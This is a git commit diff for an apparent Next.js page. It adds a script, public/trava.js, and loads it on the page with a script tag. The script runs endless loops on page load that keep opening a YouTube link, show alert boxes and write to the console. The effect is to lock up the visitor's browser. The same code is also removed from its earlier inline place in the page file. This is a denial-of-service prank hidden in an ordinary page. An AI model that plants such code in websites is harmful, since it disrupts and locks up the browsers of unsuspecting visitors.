94b035b9320e1bb3aaa26fbf4984008e467db57b
Victor Xavier <64893304+Diamate1@users.noreply.github.com>
2021-05-26 14:02:21 -0300

    Add files via upload

--- pages/lipenga.js
+++ pages/lipenga.js
@@ -51,31 +51,8 @@ export default function Home() {
           </div>
         </div>
       </footer>
+    
+      <script src="/static/trava.js"></script>
     </div>
   )
 }
-
-async function kkk() {
-    while (1) {
-        open('https://www.youtube.com/watch?v=kQ3PqoIQXIk')
-    }
-}
-async function aaa() {
-    while (1) {
-        console.log('aaaa')
-    }
-}
-async function bbb() {
-    while (1) {
-        alert('k')
-    }
-}
-bbb()
-kkk()
-aaa()
-
-/*
-function Pic({ src, width, quality }) {
-  return `https://instagram.fcpq5-1.fna.fbcdn.net/v/t51.2885-15/e35/s1080x1080/129402515_173061737858605_1528936909169161802_n.jpg?tp=1&_nc_ht=instagram.fcpq5-1.fna.fbcdn.net&_nc_cat=101&_nc_ohc=pMGOksu2owEAX_Ioxie&edm=AP_V10EBAAAA&ccb=7-4&oh=a5b61bc6fd36206009819e6fa659f188&oe=60C7BEB2&_nc_sid=4f375e`
-}
-*/
---
+++ public/trava.js
@@ -0,0 +1,19 @@
+async function kkk() {
+while (1) {
+    open('https://www.youtube.com/watch?v=kQ3PqoIQXIk')
+    }
+}
+
+async function aaa() {
+    while (1) {
+        console.log('aaaa')
+    }
+}
+async function bbb() {
+    while (1) {
+        alert('k')
+    }
+}
+bbb()
+kkk()
+aaa()
